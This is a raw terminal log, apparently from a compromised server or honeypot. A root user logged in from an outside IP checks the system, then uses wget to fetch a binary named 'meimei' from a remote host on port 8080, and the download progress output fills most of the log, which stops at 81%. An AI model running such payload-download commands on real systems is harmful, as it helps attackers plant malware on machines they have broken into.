[4hAWSWeb:~# w
[4l 18:32:16 up 10 days, 23:53,  1 users, load averages: 0.09 0.05 0.05
USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT
root     pts/2    125.65.82.89      18:32    0.09   0.05   0.05 w
[4hAWSWeb:~# uname -a
[4lLinux AWSWeb 2.6.24-2-generic #1 SMP Thu Dec 20 17:36:12 GMT 2007 i686 GNU/Linux
[4hAWSWeb:~# wget http://61.132.227.111:8080/meimei
[4l--2013-11-03 18:32:32--  http://61.132.227.111:8080/meimei
Connecting to 61.132.227.111:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1524643 (1M) [application/octet-stream]
Saving to: `meimei


 0% [>                                      ] 1,460        3K/s  eta 7m 51s
 0% [>                                      ] 4,380        3K/s  eta 6m 21s
 1% [>                                      ] 18,836       6K/s  eta 3m 42s
 1% [>                                      ] 23,180       5K/s  eta 4m 39s
 1% [>                                      ] 24,628       4K/s  eta 5m 35s
 1% [>                                      ] 24,820       4K/s  eta 6m 12s
 1% [>                                      ] 28,972       3K/s  eta 6m 14s
 2% [>                                      ] 31,868       3K/s  eta 7m 48s
 2% [>                                      ] 36,500       3K/s  eta 7m 23s
 3% [=>                                     ] 46,348       4K/s  eta 6m 7s 
 3% [=>                                     ] 48,180       3K/s  eta 6m 12s
 3% [=>                                     ] 52,140       4K/s  eta 6m 2s 
 3% [=>                                     ] 54,020       3K/s  eta 6m 13s
 3% [=>                                     ] 57,932       4K/s  eta 6m 6s 
 3% [=>                                     ] 59,860       3K/s  eta 6m 15s
 4% [=>                                     ] 63,724       3K/s  eta 6m 9s 
 4% [=>                                     ] 70,964       4K/s  eta 5m 57s
 5% [=>                                     ] 77,380       4K/s  eta 5m 42s
 5% [==>                                    ] 85,444       4K/s  eta 5m 24s
 6% [==>                                    ] 97,028       4K/s  eta 4m 53s
 6% [==>                                    ] 97,820       4K/s  eta 5m 0s 
 6% [==>                                    ] 99,268       4K/s  eta 5m 6s
 7% [==>                                    ] 107,164      4K/s  eta 4m 58s
 7% [==>                                    ] 113,880      4K/s  eta 4m 50s
 7% [===>                                   ] 118,748      4K/s  eta 4m 45s
 8% [===>                                   ] 124,100      4K/s  eta 4m 41s
 8% [===>                                   ] 127,436      4K/s  eta 4m 41s
 8% [===>                                   ] 130,332      4K/s  eta 4m 42s
 8% [===>                                   ] 134,320      4K/s  eta 4m 42s
 9% [===>                                   ] 137,572      4K/s  eta 4m 41s
 9% [===>                                   ] 140,468      4K/s  eta 4m 42s
 9% [===>                                   ] 146,000      4K/s  eta 4m 39s
 9% [===>                                   ] 149,156      4K/s  eta 4m 38s
10% [====>                                  ] 157,844      5K/s  eta 4m 27s
10% [====>                                  ] 166,440      5K/s  eta 4m 17s
11% [====>                                  ] 176,668      5K/s  eta 4m 18s
11% [====>                                  ] 178,120      5K/s  eta 4m 22s
11% [====>                                  ] 182,460      5K/s  eta 4m 21s
12% [====>                                  ] 185,356      5K/s  eta 4m 21s
12% [====>                                  ] 194,044      5K/s  eta 4m 13s
13% [=====>                                 ] 202,940      5K/s  eta 4m 4s 
14% [=====>                                 ] 214,316      5K/s  eta 3m 57s
14% [=====>                                 ] 220,108      5K/s  eta 3m 59s
15% [=====>                                 ] 228,796      5K/s  eta 3m 52s
15% [======>                                ] 238,932      5K/s  eta 3m 48s
15% [======>                                ] 241,828      5K/s  eta 3m 48s
15% [======>                                ] 243,820      5K/s  eta 3m 51s
16% [======>                                ] 247,620      5K/s  eta 3m 57s
16% [======>                                ] 250,516      5K/s  eta 3m 57s
16% [======>                                ] 257,756      5K/s  eta 3m 52s
17% [======>                                ] 259,204      5K/s  eta 3m 55s
17% [======>                                ] 261,340      5K/s  eta 3m 57s
17% [======>                                ] 264,996      5K/s  eta 3m 56s
17% [======>                                ] 272,236      5K/s  eta 3m 52s
18% [=======>                               ] 278,860      5K/s  eta 3m 48s
18% [=======>                               ] 285,268      5K/s  eta 3m 45s
18% [=======>                               ] 288,164      5K/s  eta 3m 45s
19% [=======>                               ] 292,000      5K/s  eta 3m 45s
19% [=======>                               ] 295,404      5K/s  eta 3m 45s
19% [=======>                               ] 302,220      5K/s  eta 3m 44s
20% [=======>                               ] 306,988      5K/s  eta 3m 43s
20% [========>                              ] 314,228      5K/s  eta 3m 39s
21% [========>                              ] 334,500      5K/s  eta 3m 24s
22% [========>                              ] 340,168      5K/s  eta 3m 25s
22% [========>                              ] 346,084      5K/s  eta 3m 23s
23% [=========>                             ] 353,324      5K/s  eta 3m 20s
23% [=========>                             ] 354,780      5K/s  eta 3m 21s
23% [=========>                             ] 359,116      5K/s  eta 3m 24s
24% [=========>                             ] 366,356      5K/s  eta 3m 21s
25% [=========>                             ] 383,732      5K/s  eta 3m 11s
25% [=========>                             ] 389,820      5K/s  eta 3m 9s 
25% [==========>                            ] 394,200      5K/s  eta 3m 8s
26% [==========>                            ] 401,440      6K/s  eta 3m 5s
26% [==========>                            ] 410,260      6K/s  eta 3m 2s
27% [==========>                            ] 417,368      6K/s  eta 3m 4s
27% [==========>                            ] 421,712      5K/s  eta 3m 7s
28% [==========>                            ] 428,952      5K/s  eta 3m 6s
28% [===========>                           ] 430,700      5K/s  eta 3m 7s
28% [===========>                           ] 434,744      5K/s  eta 3m 7s
28% [===========>                           ] 436,540      5K/s  eta 3m 8s
28% [===========>                           ] 440,536      5K/s  eta 3m 7s
29% [===========>                           ] 446,760      5K/s  eta 3m 6s
29% [===========>                           ] 456,464      5K/s  eta 3m 2s
29% [===========>                           ] 456,980      5K/s  eta 3m 3s
30% [===========>                           ] 460,808      5K/s  eta 3m 2s
30% [===========>                           ] 463,704      5K/s  eta 3m 3s
30% [===========>                           ] 468,660      5K/s  eta 3m 2s
31% [============>                          ] 479,632      5K/s  eta 2m 58s
31% [============>                          ] 486,872      5K/s  eta 2m 56s
33% [============>                          ] 504,248      6K/s  eta 2m 48s
33% [=============>                         ] 511,000      6K/s  eta 2m 48s
34% [=============>                         ] 524,520      6K/s  eta 2m 42s
34% [=============>                         ] 531,440      6K/s  eta 2m 40s
35% [=============>                         ] 541,896      6K/s  eta 2m 37s
35% [=============>                         ] 543,120      6K/s  eta 2m 38s
35% [==============>                        ] 547,688      6K/s  eta 2m 37s
36% [==============>                        ] 554,800      6K/s  eta 2m 35s
36% [==============>                        ] 563,616      6K/s  eta 2m 32s
37% [==============>                        ] 573,752      6K/s  eta 2m 29s
38% [==============>                        ] 579,608      6K/s  eta 2m 29s
38% [===============>                       ] 588,232      6K/s  eta 2m 27s
38% [===============>                       ] 592,760      6K/s  eta 2m 26s
39% [===============>                       ] 598,368      6K/s  eta 2m 25s
39% [===============>                       ] 604,440      6K/s  eta 2m 24s
40% [===============>                       ] 609,952      6K/s  eta 2m 23s
40% [===============>                       ] 612,848      6K/s  eta 2m 23s
40% [===============>                       ] 619,040      6K/s  eta 2m 22s
40% [===============>                       ] 621,960      6K/s  eta 2m 22s
41% [================>                      ] 629,200      6K/s  eta 2m 20s
41% [================>                      ] 637,888      6K/s  eta 2m 18s
42% [================>                      ] 645,128      6K/s  eta 2m 16s
42% [================>                      ] 649,472      6K/s  eta 2m 16s
42% [================>                      ] 654,080      6K/s  eta 2m 15s
43% [=================>                     ] 665,400      6K/s  eta 2m 12s
43% [=================>                     ] 668,296      6K/s  eta 2m 14s
44% [=================>                     ] 676,984      6K/s  eta 2m 12s
45% [=================>                     ] 692,912      6K/s  eta 2m 7s 
45% [=================>                     ] 699,328      6K/s  eta 2m 7s
45% [=================>                     ] 699,340      6K/s  eta 2m 8s
46% [==================>                    ] 708,840      6K/s  eta 2m 5s
46% [==================>                    ] 714,632      6K/s  eta 2m 5s
47% [==================>                    ] 724,768      6K/s  eta 2m 2s
48% [==================>                    ] 737,300      6K/s  eta 1m 59s
48% [==================>                    ] 740,696      6K/s  eta 1m 59s
48% [===================>                   ] 745,040      6K/s  eta 1m 58s
49% [===================>                   ] 748,980      6K/s  eta 1m 58s
49% [===================>                   ] 752,280      6K/s  eta 1m 58s
49% [===================>                   ] 755,176      6K/s  eta 1m 58s
49% [===================>                   ] 762,120      6K/s  eta 1m 56s
50% [===================>                   ] 771,104      6K/s  eta 1m 54s
50% [===================>                   ] 776,720      6K/s  eta 1m 53s
51% [===================>                   ] 779,640      6K/s  eta 1m 54s
51% [====================>                  ] 782,536      6K/s  eta 1m 54s
51% [====================>                  ] 788,328      6K/s  eta 1m 53s
52% [====================>                  ] 795,568      6K/s  eta 1m 51s
53% [====================>                  ] 808,600      6K/s  eta 1m 48s
53% [====================>                  ] 815,840      6K/s  eta 1m 47s
54% [=====================>                 ] 829,280      6K/s  eta 1m 44s
54% [=====================>                 ] 834,664      6K/s  eta 1m 43s
55% [=====================>                 ] 843,352      6K/s  eta 1m 41s
55% [=====================>                 ] 845,340      6K/s  eta 1m 41s
55% [=====================>                 ] 848,260      6K/s  eta 1m 42s
56% [=====================>                 ] 855,500      6K/s  eta 1m 41s
56% [======================>                ] 861,400      6K/s  eta 1m 40s
57% [======================>                ] 871,428      6K/s  eta 1m 38s
57% [======================>                ] 878,920      6K/s  eta 1m 37s
57% [======================>                ] 880,368      6K/s  eta 1m 37s
58% [======================>                ] 887,680      6K/s  eta 1m 36s
58% [======================>                ] 891,700      6K/s  eta 1m 36s
58% [======================>                ] 894,980      6K/s  eta 1m 36s
58% [======================>                ] 898,940      6K/s  eta 1m 36s
59% [=======================>               ] 909,076      6K/s  eta 1m 33s
60% [=======================>               ] 922,720      6K/s  eta 1m 31s
60% [=======================>               ] 924,168      6K/s  eta 1m 31s
61% [=======================>               ] 934,400      6K/s  eta 1m 29s
61% [=======================>               ] 935,848      6K/s  eta 1m 29s
61% [========================>              ] 943,828      6K/s  eta 1m 28s
62% [========================>              ] 953,380      6K/s  eta 1m 26s
62% [========================>              ] 954,828      6K/s  eta 1m 26s
63% [========================>              ] 966,996      6K/s  eta 1m 24s
63% [========================>              ] 974,236      6K/s  eta 1m 23s
64% [=========================>             ] 982,924      6K/s  eta 1m 21s
64% [=========================>             ] 988,420      6K/s  eta 1m 20s
65% [=========================>             ] 995,956      6K/s  eta 1m 19s
65% [=========================>             ] 1,006,092    6K/s  eta 1m 17s
66% [==========================>            ] 1,017,676    6K/s  eta 1m 16s
67% [==========================>            ] 1,030,708    6K/s  eta 1m 13s
67% [==========================>            ] 1,032,220    6K/s  eta 1m 13s
67% [==========================>            ] 1,036,500    6K/s  eta 1m 12s
68% [==========================>            ] 1,039,396    6K/s  eta 1m 12s
68% [==========================>            ] 1,045,360    6K/s  eta 1m 11s
68% [==========================>            ] 1,046,808    6K/s  eta 1m 11s
69% [==========================>            ] 1,052,956    6K/s  eta 1m 11s
69% [===========================>           ] 1,056,772    6K/s  eta 1m 10s
69% [===========================>           ] 1,058,796    6K/s  eta 1m 10s
69% [===========================>           ] 1,062,564    6K/s  eta 1m 9s 
69% [===========================>           ] 1,065,460    6K/s  eta 1m 10s
70% [===========================>           ] 1,072,700    6K/s  eta 1m 9s 
70% [===========================>           ] 1,073,224    6K/s  eta 1m 10s
70% [===========================>           ] 1,080,712    6K/s  eta 1m 9s 
71% [===========================>           ] 1,088,048    6K/s  eta 1m 8s
71% [===========================>           ] 1,091,192    6K/s  eta 1m 7s
71% [===========================>           ] 1,094,336    6K/s  eta 1m 7s
72% [============================>          ] 1,098,004    6K/s  eta 1m 7s
72% [============================>          ] 1,100,100    6K/s  eta 1m 7s
72% [============================>          ] 1,105,340    6K/s  eta 1m 6s
72% [============================>          ] 1,111,104    6K/s  eta 1m 5s
73% [============================>          ] 1,115,296    6K/s  eta 1m 4s
73% [============================>          ] 1,120,012    6K/s  eta 1m 3s
73% [============================>          ] 1,124,204    6K/s  eta 1m 3s
74% [============================>          ] 1,130,492    6K/s  eta 1m 2s
74% [============================>          ] 1,133,636    6K/s  eta 1m 1s
74% [=============================>         ] 1,135,732    6K/s  eta 1m 1s
74% [=============================>         ] 1,137,828    6K/s  eta 1m 2s
74% [=============================>         ] 1,139,924    6K/s  eta 1m 1s
75% [=============================>         ] 1,143,592    6K/s  eta 1m 1s
75% [=============================>         ] 1,147,260    6K/s  eta 1m 2s
75% [=============================>         ] 1,150,404    6K/s  eta 1m 1s
75% [=============================>         ] 1,150,776    6K/s  eta 1m 1s
75% [=============================>         ] 1,152,236    5K/s  eta 1m 2s
75% [=============================>         ] 1,154,856    5K/s  eta 1m 1s
75% [=============================>         ] 1,158,000    5K/s  eta 1m 1s
76% [=============================>         ] 1,159,048    5K/s  eta 1m 1s
76% [=============================>         ] 1,160,620    5K/s  eta 1m 1s
76% [=============================>         ] 1,163,764    5K/s  eta 1m 1s
76% [=============================>         ] 1,169,004    5K/s  eta 1m 0s
76% [=============================>         ] 1,172,148    5K/s  eta 1m 0s
77% [==============================>        ] 1,175,292    5K/s  eta 59s  
77% [==============================>        ] 1,176,864    5K/s  eta 59s
77% [==============================>        ] 1,177,912    5K/s  eta 59s
77% [==============================>        ] 1,180,008    5K/s  eta 59s
77% [==============================>        ] 1,182,104    5K/s  eta 59s
77% [==============================>        ] 1,182,896    5K/s  eta 59s
77% [==============================>        ] 1,184,200    5K/s  eta 59s
77% [==============================>        ] 1,187,868    5K/s  eta 58s
78% [==============================>        ] 1,192,060    5K/s  eta 58s
78% [==============================>        ] 1,195,728    5K/s  eta 57s
78% [==============================>        ] 1,202,016    5K/s  eta 56s
79% [==============================>        ] 1,210,924    5K/s  eta 54s
79% [===============================>       ] 1,212,096    5K/s  eta 54s
79% [===============================>       ] 1,212,620    5K/s  eta 54s
79% [===============================>       ] 1,217,736    5K/s  eta 53s
80% [===============================>       ] 1,222,316    5K/s  eta 52s
80% [===============================>       ] 1,225,072    5K/s  eta 52s
80% [===============================>       ] 1,227,168    5K/s  eta 52s
80% [===============================>       ] 1,228,216    5K/s  eta 52s
80% [===============================>       ] 1,229,788    5K/s  eta 52s
80% [===============================>       ] 1,233,456    5K/s  eta 51s
81% [===============================>       ] 1,236,600    5K/s  eta 51s
81% [===============================>       ] 1,238,376    5K/s  eta 51s
81% [===============================>       ] 1,242,364    5K/s  eta 50s
81% [===============================>       ] 1,243,412    5K/s  eta 50s
81% [===============================>       ] 1,245,676    5K/s  eta 50s
